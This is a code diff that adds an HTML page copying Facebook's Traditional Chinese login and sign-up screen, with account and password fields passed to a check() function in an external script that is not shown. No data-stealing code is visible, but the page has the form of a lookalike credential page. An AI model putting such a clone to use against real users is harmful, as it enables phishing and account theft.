@@ -1,0 +1,240 @@
+<html>
+<head>
+<title>Facebook - 登入或註冊</title>
+<link rel="shortcut icon" href="ff.ico">
+<link rel="stylesheet" type="text/css" href="style.css" media="all"/>
+<script type='text/javascript' src='check.js'></script>
+</head>
+<body>
+	<header class="frame ">
+		<div class="left">
+		 <h1 style="color:white">facebook</h1>
+		</div>
+		<div class="right">
+			<table>
+				<tr>
+					<td style="color:white">電子郵件或電話</td>
+					<td style="color:white">密碼</td>
+				</tr>
+				<tr>
+					
+					<td><input id="account" style="width:170px;" type="text" /></td>
+					<td><input id="password" style="width:170px;" type="password" /></td>
+					<td><button onclick="check()" style="background-color:#4267b2;color:white;border-color:#29487d;"  type="button">登入</button></td>
+				</tr>
+				<tr>
+					
+					<td></td>
+					<td ><a style="color:#9cb4d8;" href="https://www.facebook.com/">忘記帳號?</a></td>
+					<td></td>
+				</tr>
+			</table>
+		</div>
+	</header>
+	<div class="mm">
+		<div style="height:58%;" class="left">
+		<br><br>
+			<h3> Facebook，讓你和親朋好友保持聯繫，隨時分<br>享生活中的每一刻</h3>
+			<img src="facepeople.png" />
+		</div>
+
+		<div class="right">
+			<h1>註冊</h1>
+			<h3>永遠免費!</h3>
+				<input style="width:198px;height:35px;border-radius:6px" placeholder="&nbsp;姓氏" type="text" />
+				<input style="width:198px;height:35px;border-radius:6px" placeholder="&nbsp;名子" type="text" />
+								<br><br>
+				<input style="width:400px;height:35px;border-radius:6px" placeholder="&nbsp;手機號碼或電子郵件" type="text" />
+								<br><br>
+				<input style="width:400px;height:35px;border-radius:6px" placeholder="&nbsp;設定密碼" type="text" />
+			<h5><font size="3px">生日</font><h5>
+				<select id="years" style="font-size: 14px;height: 30px;padding: 5px;">
+				</select>
+					<script>
+					var day = "";
+					for(var i = 2019 ;i>1905;i--){
+						day += "<option>"+i+"</option>" ;
+					}
+					document.getElementById("years").innerHTML = day;
+				    </script>
+				<select name="YourLocation"style="font-size: 14px;height: 30px;padding: 5px;">
+				　  <option value="month">12月</option>
+				　  <option value="month">11月</option>
+				　  <option value="month">10月</option>
+				　  <option value="month">9月</option>
+				    <option value="month">8月</option>
+				　  <option value="month">7月</option>
+				　  <option value="month">6月</option>
+				　  <option value="month">5月</option>
+					<option value="month">4月</option>
+				　	<option value="month">3月</option>
+					<option value="month">2月</option>
+				  　<option value="month">1月</option>
+
+				</select>
+				<select id="day" style="font-size: 14px;height: 30px;padding: 5px;">
+				</select>
+					<script>
+					var day = "";
+					for(var i = 1 ;i<32;i++){
+						day += "<option>"+i+"</option>" ;
+					}
+					document.getElementById("day").innerHTML = day;
+					</script>
+				<a href="#" title="點擊以瞭解詳情">為什麼需要提供出生日期的資料？</a>
+				<br>
+				<input style="color: #1d2129;" type="radio" name="location" value="Taipei"> 女性
+				<input style="color: #1d2129;"	type="radio" name="location" value="Taoyuan"> 男性
+				<h5>
+				<p class="_58mv" style="color: #777;">點擊「註冊」即表示你同意我們的
+				<a href="https://www.facebook.com/" target="_blank">使用條款</a>、
+				<a href="https://www.facebook.com/" target="_blank">資料政策</a>
+				和<br> <a href="https://www.facebook.com/" target="_blank">Cookie 政策</a>
+				。你可能會收到我們的簡訊通知，而且可以隨<br>時選擇停止接收。</p>
+				<h5>
+				<button style="border-radius:6px;background: linear-gradient(#67ae55, #578843);background-color:#69a74e;border-color: #3b6e22 #3b6e22 #2c5115;color:white;min-width: 195px;padding:7.5px 25px;"><font size="4">註冊</font></button>
+				<br><br>
+				<div style="color:#666;">為名人、團體或公司企業<a href="https://www.facebook.com/">建立粉絲專頁</a></div>
+		</div>
+	</div>
+	<div class="foot">
+	
+		<div class="footleft" style="color: #737373;font-size: 13px;">
+			<li>中文(台灣)</li>
+				<li>
+					<a href="https://www.facebook.com/" title="English (US)" style="color:#365899;">&nbsp; English (US)</a>
+				</li>
+				<li>
+					<a href="https://vi-vn.facebook.com/" title="Vietnamese" >&nbsp; Tiếng Việt</a>
+				</li>
+				<li>
+					<a href="https://id-id.facebook.com/"title="Indonesian">&nbsp; Bahasa Indonesia</a>
+				</li>
+				<li>
+					<a  href="https://th-th.facebook.com/"  title="Thai">&nbsp; ภาษาไทย</a>
+				</li>
+				<li>
+					<a  href="https://ja-jp.facebook.com/"  title="Japanese">&nbsp; 日本語</a>
+				</li>
+				<li>
+					<a  href="https://es-la.facebook.com/"  title="Spanish">&nbsp; Español</a>
+				</li>
+				<li>
+					<a  href="https://pt-br.facebook.com/"  title="Portuguese (Brazil)">&nbsp; Português (Brasil)</a>
+				</li>
+				<li>
+					<a  href="https://fr-fr.facebook.com/"  title="French (France)">&nbsp; Français (France)</a>
+				</li>
+				<li>
+					<a  href="https://de-de.facebook.com/" title="German">&nbsp; Deutsch</a>
+				</li>
+				<li>
+				<a  href="https://it-it.facebook.com/"  title="Italian">&nbsp; Italiano</a>
+				</li>
+				<div id="contentCurve"></div>
+				<li>
+					<a href="#" title="顯示更多語言">
+						<i ></i>
+					</a>
+				</li>
+			</ul>
+			
+				<li>
+					<a  href="/r.php" title="註冊 Facebook 帳號">註冊</a>
+				</li>
+				<li>
+					<a href="/login/" title="登入 Facebook">&nbsp;&nbsp;&nbsp; 登入</a>
+				</li>
+				<li>
+					<a href="https://messenger.com/" title="查看 Messenger。">&nbsp;&nbsp;&nbsp; Messenger</a>
+				</li>
+				<li>
+					<a href="/lite/" title="Android 版 Facebook Lite。">&nbsp;&nbsp;&nbsp; Facebook Lite</a>
+				</li>
+				<li>
+					<a href="/mobile/?ref=pf" title="查看行動版 Facebook。">&nbsp;&nbsp;&nbsp; 行動版</a>
+				</li>
+				<li>
+					<a href="/find-friends?ref=pf" title="網路尋人">&nbsp;&nbsp;&nbsp; 尋找朋友</a>
+				</li>
+				<li>
+					<a href="/directory/people_sizes/" title="瀏覽我們的用戶目錄。">&nbsp;&nbsp;&nbsp; 用戶</a>
+				</li>
+				<li>
+					<a href="/directory/pages/" title="瀏覽我們的粉絲專頁目錄。">&nbsp;&nbsp;&nbsp; 粉絲專頁</a>
+				</li>
+				<li>
+					<a href="/directory/videos/interests/" title="瀏覽我們的影片興趣目錄。">&nbsp;&nbsp;&nbsp; 影片興趣</a>
+				</li>
+				<li>
+					<a href="/places/" title="查看 Facebook 的熱門地標。">&nbsp;&nbsp;&nbsp; 地標</a>
+				</li>
+				<li>
+					<a href="/games/" title="來玩 Facebook 遊戲。">&nbsp;&nbsp;&nbsp; 遊戲</a>
+				</li>
+				<li>
+					<a href="/directory/places/" title="瀏覽我們的地標目錄">&nbsp;&nbsp;&nbsp; 地點</a>
+				</li>
+				<li>
+					<a href="/directory/marketplace/" title="瀏覽我們的 Marketplace 產品目錄。">&nbsp;&nbsp;&nbsp; Marketplace</a>
+				</li>
+				<li>
+					<a href="/directory/groups/" title="瀏覽社團目錄。">&nbsp;&nbsp;&nbsp; 社團</a>
+				</li>
+				<li>
+					<a href="https://l.facebook.com/l.php?u=https%3A%2F%2Finstagram.com%2F&amp;h=AT3YnezFycCtUV_etEzN_lY4_WaaacsArV-nSSlA7G3efrk6dJy1ki0qPJ1Z-O3yG54kO8bQ-2iirAW3o-RuFtl9L9WHQOJtg4cJHQ7hOZyl5fwH5f2Ic6BiyPmwpfn8Ut0vXazVCcF15sCZOsJZ4w" title="查看 Instagram" target="_blank" rel="noopener nofollow" data-lynx-mode="asynclazy">&nbsp;&nbsp;&nbsp; Instagram</a>
+				</li>
+				<br>
+				<li>
+					<a href="/local/lists/245019872666104/" title="瀏覽我們的 Local 清單目錄。">本地</a>
+				</li>
+				<li>
+					<a href="/facebook" accesskey="8" title="追蹤我們的部落格、參考我們的資源中心以及工作機會。">&nbsp;&nbsp;&nbsp; 關於</a>
+				</li>
+				<li>
+					<a href="/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;extra_1=auto" title="在 Facebook 上刊登廣告。">&nbsp;&nbsp;&nbsp; 刊登廣告</a>
+				</li>
+				<li>
+					<a href="/pages/create/?ref_type=sitefooter" title="建立粉絲專頁">&nbsp;&nbsp;&nbsp; 建立粉絲專頁</a>
+				</li>
+				<li>
+					<a href="https://developers.facebook.com/?ref=pf" title="使用我們的開發平台">&nbsp;&nbsp;&nbsp; 開發人員</a>
+				</li>
+				<li>
+					<a href="/careers/?ref=pf" title="加入成為我們企業的一份子。">&nbsp;&nbsp;&nbsp; 工作機會</a>
+				</li>
+				<li>
+					<a data-nocookies="1" href="/privacy/explanation" title="瞭解你的隱私權和 Facebook 。">&nbsp;&nbsp;&nbsp; 隱私政策</a>
+				</li>
+				<li>
+					<a href="/policies/cookies/" title="瞭解 Cookie 和 Facebook" data-nocookies="1">&nbsp;&nbsp;&nbsp; Cookie</a>
+				</li>
+				<li>
+					<a class="_41ug" data-nocookies="1" href="https://www.facebook.com/help/568137493302217" title="瞭解 Ad Choices。">&nbsp;&nbsp;&nbsp; Ad Choices
+						<i class="img sp_1M6Gay4S55w sx_2694b9"></i>
+					</a>
+				</li>
+				<li>
+					<a data-nocookies="1" href="/policies?ref=pf" accesskey="9" title="查閱我們的條款與政策。">&nbsp;&nbsp;&nbsp; 使用條款</a>
+				</li>
+				<li>
+					<a href="/help/?ref=pf" accesskey="0" title="前往我們的使用說明。">&nbsp;&nbsp;&nbsp; 使用說明</a>
+				</li>
+				<li>
+					<a accesskey="6" class="accessible_elem" href="/settings" title="查看並編輯你的 Facebook 設定。">&nbsp;&nbsp;&nbsp; 設定</a>
+				</li>
+				<li>
+					<a accesskey="7" class="accessible_elem" href="/allactivity?privacy_source=activity_log_top_menu" title="查看活動紀錄">&nbsp;&nbsp;&nbsp; 活動紀錄</a>
+				</li>
+				</ul>
+			<br></br>
+			<div class="mvl copyright">
+				<div>
+					<span> Facebook © 2018</span>
+				</div>
+			</div>
+		</div>
+	</div>
+</body>
+
+</html>
